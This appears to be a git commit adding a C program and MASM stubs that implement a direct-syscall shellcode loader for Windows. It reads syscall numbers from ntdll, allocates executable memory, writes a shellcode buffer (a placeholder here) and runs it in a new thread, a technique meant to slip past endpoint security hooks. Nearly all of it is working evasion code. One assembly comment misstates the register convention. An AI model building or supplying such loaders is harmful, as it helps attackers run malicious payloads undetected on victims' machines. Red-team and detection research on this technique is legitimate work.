a4df8b770aa3393f55c58cbe7256b4fb4bac9387
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2023-05-23 08:41:31 +0200

    Add files via upload

---
+++ Direct_Syscalls_Create_Thread/Direct_Syscalls_Create_Thread/Direct_Syscalls_Create_Thread.c
@@ -0,0 +1,55 @@
+#include <windows.h>  
+#include <stdio.h>    
+#include "syscalls.h" 
+
+
+//// Declare global variables to hold syscall numbers
+DWORD wNtAllocateVirtualMemory;
+DWORD wNtWriteVirtualMemory;
+DWORD wNtCreateThreadEx;
+DWORD wNtWaitForSingleObject;
+
+int main() {
+    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
+    SIZE_T buffSize = 0x1000;  // Declare the size of the buffer (4096 bytes)
+
+    // Get a handle to the ntdll.dll library
+    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
+
+    // Declare and initialize a pointer to the NtAllocateVirtualMemory function
+    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    // Read the syscall number from the NtAllocateVirtualMemory function in ntdll.dll
+    // This is typically located at the 4th byte of the function
+    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
+
+    // Declare and initialize a pointer to the NtWriteVirtualMemory function
+    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
+
+    // Declare and initialize a pointer to the NtCreateThreadEx function
+    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
+    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
+
+    // Declare and initialize a pointer to the NtWaitForSingleObject function
+    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
+    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];
+
+
+    // Replace this with your actual shellcode
+    unsigned char shellcode[] = "\xfc\x48\x83...";
+
+
+    // Use the NtAllocateVirtualMemory syscall to allocate memory for the shellcode
+    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    
+    ULONG bytesWritten;
+    // Use the NtWriteVirtualMemory syscall to write the shellcode into the allocated memory
+    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);
+
+    HANDLE hThread;
+    // Use the NtCreateThreadEx syscall to create a new thread that starts executing the shellcode
+    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
+
+    // Use the NtWaitForSingleObject syscall to wait for the new thread to finish executing
+    NtWaitForSingleObject(hThread, FALSE, NULL);
+}
---
+++ Direct_Syscalls_Create_Thread/Direct_Syscalls_Create_Thread/syscalls.asm
@@ -0,0 +1,44 @@
+EXTERN wNtAllocateVirtualMemory:DWORD               ; Extern keyword indicates that the symbol is defined in another module. Here it's the syscall number for NtAllocateVirtualMemory.
+EXTERN wNtWriteVirtualMemory:DWORD                  ; Syscall number for NtWriteVirtualMemory.
+EXTERN wNtCreateThreadEx:DWORD                      ; Syscall number for NtCreateThreadEx.
+EXTERN wNtWaitForSingleObject:DWORD                 ; Syscall number for NtWaitForSingleObject.
+
+
+.CODE  ; Start the code section
+
+; Procedure for the NtAllocateVirtualMemory syscall
+NtAllocateVirtualMemory PROC
+    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
+    mov eax, wNtAllocateVirtualMemory               ; Move the syscall number into the eax register.
+    syscall                                         ; Execute syscall.
+    ret                                             ; Return from the procedure.
+NtAllocateVirtualMemory ENDP                     ; End of the procedure.
+
+
+; Similar procedures for NtWriteVirtualMemory syscalls
+NtWriteVirtualMemory PROC
+    mov r10, rcx
+    mov eax, wNtWriteVirtualMemory
+    syscall
+    ret
+NtWriteVirtualMemory ENDP
+
+
+; Similar procedures for NtCreateThreadEx syscalls
+NtCreateThreadEx PROC
+    mov r10, rcx
+    mov eax, wNtCreateThreadEx
+    syscall
+    ret
+NtCreateThreadEx ENDP
+
+
+; Similar procedures for NtWaitForSingleObject syscalls
+NtWaitForSingleObject PROC
+    mov r10, rcx
+    mov eax, wNtWaitForSingleObject
+    syscall
+    ret
+NtWaitForSingleObject ENDP
+
+END  ; End of the module
